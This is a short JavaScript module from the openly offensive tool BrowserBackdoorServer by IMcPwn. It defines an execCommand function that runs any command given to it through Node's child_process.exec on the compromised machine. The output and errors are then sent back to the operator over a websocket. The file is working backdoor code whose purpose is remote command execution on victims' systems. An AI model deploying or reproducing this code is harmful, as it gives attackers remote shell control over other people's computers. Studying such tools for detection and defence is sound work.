// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Executes a command
 * Parameters: command
 * Returns: undefined, error, stdout, stderr
 * Author: IMcPwn
 */

exec = require('child_process').exec;

execCommand = function (cmd) {
    exec(cmd, function (err, stdout, stderr) {
        if (err) ws.send(err);
        ws.send('stdout: ' + stdout);
        ws.send('stderr: ' + stderr);
    });
}

return "\nUsage: execCommand(cmd)\n- cmd is the command to be executed.";
